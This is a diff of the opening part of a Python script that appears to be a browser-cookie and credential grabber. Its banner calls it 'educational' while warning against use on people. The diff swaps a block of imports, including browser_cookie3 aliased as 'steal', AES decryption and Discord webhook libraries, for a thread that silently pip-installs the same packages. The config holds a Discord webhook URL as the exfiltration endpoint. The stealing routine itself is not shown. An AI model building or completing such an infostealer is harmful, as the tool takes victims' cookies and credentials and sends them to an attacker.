@@ -1,31 +1,40 @@
 # WARN: This one is for educational purposes only! I do not recommend using it on people
 
-import psutil
-import platform
-import json
-from datetime import datetime
-from time import sleep
-import requests
-import socket
-from requests import get
-import os
-import re
-import requests
+
 import subprocess
-from uuid import getnode as get_mac
-import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
-from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.backends import default_backend
-from Crypto.Cipher import AES
+import sys
+import threading
 
+# List all required packages
+required_packages = [
+    "psutil",
+    "platform",
+    "requests",
+    "browser-cookie3",
+    "cryptography",
+    "pycryptodome",
+    "dhooks"
+]
 
-from base64 import b64decode, b64encode
-from dhooks import Webhook, Embed, File
-from subprocess import Popen, PIPE
-from json import loads, dumps
-from shutil import copyfile
-from sys import argv
+def install_package(pkg):
+    """Install a single package using pip"""
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"Failed to install {pkg}: {e}")
+
+def install_packages_background(packages):
+    """Install all packages in a separate thread so main script continues"""
+    for pkg in packages:
+        try:
+            __import__(pkg.replace("-", "_"))  # Try importing
+        except ImportError:
+            install_package(pkg)
+
+# Start installation in the background
+threading.Thread(target=install_packages_background, args=(required_packages,), daemon=True).start()
+
+# --- MAIN SCRIPT CAN RUN IMMEDIATELY ---
 
 # CONFIG -> Setup before compiling
 url= "https://discord.com/api/webhooks/1491394773867561070/3BoH3T2a08A75JW37rljMNg47rJc2x4xmqWYa4ButGcBqbcljqaGGeSIIDGIFjD1xNq0" #Paste Discord Webhook url
